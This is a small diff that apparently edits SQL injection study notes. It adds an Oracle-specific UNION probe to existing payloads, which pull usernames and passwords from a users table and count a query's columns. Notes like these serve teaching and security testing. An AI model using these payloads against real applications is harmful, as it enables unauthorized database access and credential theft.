@@ -84,3 +84,5 @@ Payload: `' UNION SELECT username, password FROM users--`
 The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query. For example: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
 
 Determining the number of columns: `' ORDER BY 1--` or `' UNION SELECT NULL,NULL--` (note: number of nulls, order by = number of columns)
+
+On Oracle, every SELECT query must use the FROM keyword and specify a valid table: `' UNION SELECT NULL FROM DUAL--`
